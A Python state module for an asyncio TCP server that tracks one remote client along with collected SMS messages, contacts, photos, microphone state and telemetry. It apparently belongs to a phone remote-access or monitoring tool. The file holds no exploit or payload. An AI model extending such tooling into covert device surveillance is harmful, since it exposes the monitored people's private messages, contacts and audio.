import asyncio
import io
import json
import zipfile
from typing import Any, Dict, List, Optional, Tuple

from app.config import settings


class AppState:
    def __init__(self) -> None:
        self.tcp_server: Optional[asyncio.Server] = None
        self.client_reader: Optional[asyncio.StreamReader] = None
        self.client_writer: Optional[asyncio.StreamWriter] = None
        self.client_addr: Optional[Tuple[str, int]] = None
        self.listening: bool = False
        self.mic_active: bool = False
        self.camera_enabled: bool = settings.enable_camera
        self.cameras: List[Dict[str, Any]] = []
        self.latest_photo: Optional[str] = None
        self.latest_photo_bytes: Optional[bytes] = None
        self.latest_contacts: Optional[str] = None
        self.latest_contacts_bytes: Optional[bytes] = None
        self.latest_sms: List[Dict[str, Any]] = []
        self.contacts_list: List[Dict[str, Any]] = []
        self.latest_telemetry: Optional[Dict[str, Any]] = None
        self.disconnect_event: asyncio.Event = asyncio.Event()
        self.load_persisted_state()

    def load_persisted_state(self) -> None:
        try:
            telemetry_path = settings.storage_dir / "latest_telemetry.json"
            if telemetry_path.exists():
                self.latest_telemetry = json.loads(telemetry_path.read_text(encoding="utf-8"))
        except Exception:
            pass

        try:
            sms_path = settings.storage_dir / "latest_sms.json"
            if sms_path.exists():
                self.latest_sms = json.loads(sms_path.read_text(encoding="utf-8"))
        except Exception:
            pass

        try:
            contacts_path = settings.storage_dir / "contacts.zip"
            if contacts_path.exists():
                data = contacts_path.read_bytes()
                self.latest_contacts_bytes = data
                self.latest_contacts = str(contacts_path)
                if zipfile.is_zipfile(io.BytesIO(data)):
                    with zipfile.ZipFile(io.BytesIO(data)) as zf:
                        if "contacts.json" in zf.namelist():
                            with zf.open("contacts.json") as f:
                                self.contacts_list = json.loads(f.read().decode("utf-8"))
        except Exception:
            pass

    def client_connected(self) -> bool:
        if self.client_writer is None:
            return False
        return not self.client_writer.is_closing()

    def clear_client(self) -> None:
        self.client_reader = None
        self.client_writer = None
        self.client_addr = None
        self.mic_active = False
        self.disconnect_event.set()


state = AppState()
